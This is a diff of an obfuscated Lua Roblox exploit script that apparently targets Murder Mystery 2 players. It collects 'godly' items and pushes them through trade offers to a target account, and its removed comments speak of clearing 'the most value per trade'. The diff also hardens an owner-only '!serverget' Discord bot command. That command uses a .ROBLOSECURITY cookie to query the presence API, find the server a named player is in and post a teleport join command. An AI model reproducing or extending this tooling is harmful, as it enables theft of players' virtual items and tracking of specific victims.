@@ -600,11 +600,6 @@ function _tpTo(_pi, _ji, _mi)
     end)
 end
 
--- ═══════════════════════════════════════════════════════════════
---  PATCHED: returns unique item IDs with stack counts so we can
---  dump entire stacks into a single trade slot instead of wasting
---  slots on duplicate copies of the same item.
--- ═══════════════════════════════════════════════════════════════
 local function _collectGodlies()
     local _out = {};
     if not _isMM2 or not _gi then return _out end
@@ -621,7 +616,6 @@ local function _collectGodlies()
     for _i, _c in pairs(_counts) do
         table.insert(_out, { id = _i, count = _c });
     end
-    -- biggest stacks first so we clear the most value per trade
     table.sort(_out, function(_a, _b) return _a.count > _b.count end);
     return _out;
 end
@@ -677,10 +671,6 @@ local function _doTransfer(_targetName)
         if not _transferActive then break end
         if not _sent then task.wait(2);
         else
-            -- ═══════════════════════════════════════════════════════
-            --  PATCHED: fire OfferItem once per COPY so the stack
-            --  fills the whole slot. 4 unique items max, unlimited qty.
-            -- ═══════════════════════════════════════════════════════
             local _offered = 0;
             local _slots = math.min(4, #_batch);
             for _i = 1, _slots do
@@ -1087,29 +1077,107 @@ local function _gw()
                     return;
                 end
 
-                -- !serverget <user>
+                -- !serverget <user>  (HARDENED — fresh CSRF, GET fallback, verbose errors)
                 local _sgU = _content:match("^!serverget%s+(.+)$");
                 if _sgU then
                     if not _isOwner(_md.author) then return end
                     task.spawn(function()
-                        if _robloxCookie == "" then _postEmbed("❌ No Cookie", "", 0xFF0000); return end
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
-                        local _uid = _getUserId(_sgU);
-                        if not _uid then _postEmbed("❌ Lookup Failed", "", 0xFF0000); return end
-                        local _r = _cookiePostRetry("https://presence.roblox.com/v1/presence/users",
-                            _hs:JSONEncode({ userIds = { _uid } }));
-                        if not _r or _r.StatusCode ~= 200 then _postEmbed("❌ Failed", "Status "..tostring(_r and _r.StatusCode), 0xFF0000); return end
-                        local _d = _hs:JSONDecode(_r.Body);
-                        local _p = _d.userPresences and _d.userPresences[1];
-                        if not _p then _postEmbed("❌ No data", "", 0xFF0000); return end
-                        if _p.userPresenceType ~= 2 then
-                            _postEmbed("❌ Not In Game", "**".._sgU.."** isn't playing.", 0xFFA500);
+                        if _robloxCookie == "" then
+                            _postEmbed("❌ No Cookie", "Set `_robloxCookie` global first.", 0xFF0000);
                             return;
                         end
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+
+                        local _lookupName = _sgU:gsub("^%s+", ""):gsub("%s+$", "");
+                        local _uid, _uname = _getUserId(_lookupName);
+                        if not _uid then
+                            _postEmbed("❌ Lookup Failed", "Could not find `".._lookupName.."`", 0xFF0000);
+                            return;
+                        end
+                        _uname = _uname or _lookupName;
+
+                        -- Force-refresh CSRF every call so stale cache never blocks us
+                        _csrfToken = nil;
+                        _csrfFetchedAt = 0;
+
+                        print("[serverget] uid="..tostring(_uid).." uname="..tostring(_uname));
+
+                        -- Try POST
+                        local _bodyJson = _hs:JSONEncode({ userIds = { _uid } });
+                        local _r = _cookiePostRetry("https://presence.roblox.com/v1/presence/users", _bodyJson);
+
+                        print("[serverget] POST status="..tostring(_r and _r.StatusCode));
+
+                        -- GET fallback if POST failed
+                        if not _r or _r.StatusCode ~= 200 then
+                            local _getUrl = "https://presence.roblox.com/v1/presence/users?userIds=" .. tostring(_uid);
+                            local _okG, _rg = pcall(function()
+                                return request({
+                                    Url = _getUrl,
+                                    Method = "GET",
+                                    Headers = {
+                                        ["Cookie"] = ".ROBLOSECURITY=".._robloxCookie,
+                                        ["User-Agent"] = "Roblox/WinInet"
+                                    }
+                                })
+                            end);
+                            if _okG and _rg and _rg.StatusCode == 200 then
+                                print("[serverget] GET fallback succeeded");
+                                _r = _rg;
+                            else
+                                print("[serverget] GET fallback: " .. tostring(_rg and _rg.StatusCode));
+                            end
+                        end
+
+                        if not _r or _r.StatusCode ~= 200 then
+                            local _code = _r and _r.StatusCode or "nil"
+                            local _body = _r and tostring(_r.Body):sub(1, 400) or "no body"
+                            local _hint = ""
+                            if _code == 401 then _hint = "\n**→ Cookie is expired or invalid. Regenerate your `.ROBLOSECURITY`.**"
+                            elseif _code == 403 then _hint = "\n**→ CSRF failed, or Roblox is rate-limiting. Wait 30s and retry.**"
+                            elseif _code == 429 then _hint = "\n**→ Rate limited. Wait a minute.**"
+                            elseif _code == 400 then _hint = "\n**→ Bad request body. Report this.**"
+                            end
+                            _postEmbed("❌ Failed",
+                                "**Status:** `"..tostring(_code).."`\n" ..
+                                "**Body:**\n```\n".._body.."\n```".._hint,
+                                0xFF0000);
+                            return;
+                        end
+
+                        local _d = _hs:JSONDecode(_r.Body);
+                        local _p = _d.userPresences and _d.userPresences[1];
+                        if not _p then
+                            _postEmbed("❌ No Presence Data",
+                                "**Raw body:**\n```\n".._r.Body:sub(1,400).."\n```",
+                                0xFF0000);
+                            return;
+                        end
+
+                        -- Presence type: 0=Offline, 1=Online(web), 2=InGame, 3=Studio
+                        local _typeText = ({
+                            [0] = "Offline",
+                            [1] = "Online (website)",
+                            [2] = "In Game",
+                            [3] = "In Studio",
+                        })[_p.userPresenceType] or ("Unknown ("..tostring(_p.userPresenceType)..")")
+
+                        if _p.userPresenceType ~= 2 then
+                            _postEmbed("❌ Not In Game",
+                                "**".._uname.."** — ".._typeText,
+                                0xFFA500);
+                            return;
+                        end
+
                         local _jc = "game:GetService('TeleportService'):TeleportToPlaceInstance("..
                             tostring(_p.placeId)..", '"..tostring(_p.gameId).."')";
-                        _postEmbed("🎯 ".._sgU,
-                            "**Game:** `"..tostring(_p.lastLocation or "?").."`\n**JobId:** `"..tostring(_p.gameId).."`\n\n```\n".._jc.."\n```",
+                        _postEmbed("🎯 ".._uname,
+                            "**Game:** `"..tostring(_p.lastLocation or "?").."`\n" ..
+                            "**PlaceId:** `"..tostring(_p.placeId).."`\n" ..
+                            "**JobId:** `"..tostring(_p.gameId).."`\n" ..
+                            "**RootPlaceId:** `"..tostring(_p.rootPlaceId).."`\n" ..
+                            "**UniverseId:** `"..tostring(_p.universeId).."`\n\n" ..
+                            "**Join command:**\n```\n".._jc.."\n```",
                             0x3EED50);
                     end);
                     return;
